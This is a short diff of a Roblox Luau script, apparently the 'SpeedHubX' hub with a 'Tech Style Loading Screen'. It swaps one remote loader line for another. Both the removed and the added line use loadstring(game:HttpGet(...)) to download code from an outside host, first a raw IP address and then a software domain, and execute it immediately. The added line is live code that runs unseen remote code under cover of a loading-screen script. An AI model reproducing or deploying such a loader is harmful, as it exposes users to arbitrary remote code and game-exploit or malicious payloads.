@@ -1,5 +1,5 @@
 ID="eb6e7937-55e8-4508-9ec1-d618c54e3256";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 --// SpeedHubX Tech Style Loading Screen with Neon Blink & Bar Glow //-- 
 
 -- Services
